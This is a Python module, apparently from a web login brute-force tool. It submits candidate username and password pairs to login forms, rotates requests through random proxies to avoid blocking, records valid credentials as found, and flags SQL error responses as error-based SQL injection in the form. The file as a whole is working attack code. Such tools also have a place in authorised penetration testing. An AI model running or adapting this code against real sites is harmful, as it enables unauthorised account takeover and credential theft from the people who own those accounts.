from utils import events
from cores.actions import randomFromList
from cores.check import parseLoginForm, check_sqlerror


def check_condition(options, proc, loginInfo):
	"""
		Check logged in successfully condition.
		This function will check SQL injection as well
			return 0 -> False
			return 1 -> True
			return 2 -> Should be SQL Injection error-based
	"""
	if options.panel_url:
		# User provided panel url (/wp-admin/ for example, repopen this url to check sess)
		proc.open_url(options.panel_url)
		if not parseLoginForm(proc.forms()):  # != loginInfo:
			if check_sqlerror(proc.get_resp()):
				return 2
			else:
				return 1
		else:
			return 0
	else:
		# User provided direct login URL (/wp-login.php).
		# DEBUG
		# proc.open(options.url)
		# if parseLoginForm(proc.forms()) != loginInfo:
		# 	return 1
		# else:
		# 	return 0
		if check_sqlerror(proc.get_resp()):
			return 2
		else:
			return 1


def submit(options, loginInfo, tryCred, result):
	# frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred
	
	# proc = Browser(options.timeout) # TODO recovery here
	
	# BREAK if we had valid payload?
	# if options.options["-p"] == "sqli" and len(list(result.queue)) > 1:
	# 	return True
	
	if tryUsername in [x[1] for x in list(result.queue)]:
		return True
	
	from cores.browser import Browser
	try:
		proc = Browser()
		if options.proxy:
			# Set proxy connect
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy(proxyAddr)
		else:
			proxyAddr = ""
		
		proc.open_url(options.login_url)
		_form = parseLoginForm(proc.forms())
		
		if not _form:
			if options.verbose:
				events.error("Get blocked", "BRUTE")
			return False
		else:
			frmCtrl, frmFields = _form
			frmLoginID, btnSubmit = frmCtrl
		if options.verbose and loginInfo != _form:
			events.info("Login form has been changed", "BRUTE")
		#	Select login form
		# page_title = proc.title()
		#	Send request
		
		#	Reload the browser. For javascript redirection and others...
		# proc.reload()
		#	If no login form -> maybe success. Check conditions
		resp = proc.xsubmit(frmCtrl, frmFields, tryCred)
		if options.verbose:
			if len(frmFields) == 2:
				events.warn("['%s']['%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "TRY")
			else:
				events.warn("['%s'] <--> %s" % (tryPassword, proxyAddr), "TRY")
		
		if not parseLoginForm(proc.forms()):  # != loginInfo:
			test_result = check_condition(options, proc, loginInfo)
			if test_result == 1:
				# "If we tried login form with username+password field"
				
				if tryUsername:
					if resp.status_code >= 400:
						events.error("['%s':'%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "%s" % (resp.status_code))
					else:
						events.found(tryUsername, tryPassword, proc.get_title())
						# events.success("['%s':'%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "FOUND")
						result.put([options.url, tryUsername, tryPassword])
				# "Else If we tried login form with password field only"
				else:
					if resp.status_code >= 400:
						events.error("[%s] <--> %s" % (tryPassword, proxyAddr), "%s" % (resp.status_code))
					else:
						events.found('', tryPassword, proc.get_title())
						# events.success("[%s] [%s]" % (tryPassword, proc.get_title()), "FOUND")
						result.put([options.url, tryUsername, tryPassword])
			elif test_result == 2 and options.verbose:
				events.success("SQL Injection in login form", "BRUTE")
				events.info("['%s': '%s']" % (tryUsername, tryPassword))
			else:
				# Possibly Error. But sometime it is true
				if options.verbose:
					events.error("['%s': '%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "BRUTE")
		# "Login form is still there. Oops"
		else:
			if check_sqlerror(proc.get_resp()) and options.verbose:
				events.success("SQL Injection in login form", "BRUTE")
				events.info("['%s': '%s']" % (tryUsername, tryPassword))
			if options.verbose:
				if tryUsername:
					events.fail("['%s':'%s'] <--> %s ==> %s" % (tryUsername, tryPassword, proxyAddr, proc.get_title()))
				else:
					events.fail("Failed: [%s] <--> %s ==> %s" % (tryPassword, proxyAddr, proc.get_title()))
		
		return True
	
	except Exception as error:
		"""
			Sometimes, web servers return error code because of bad configurations,
			but our cred is true.
			This code block showing information, for special cases
		"""
		
		events.error("%s" % (error), "BRUTE")
	
	finally:
		proc.close()
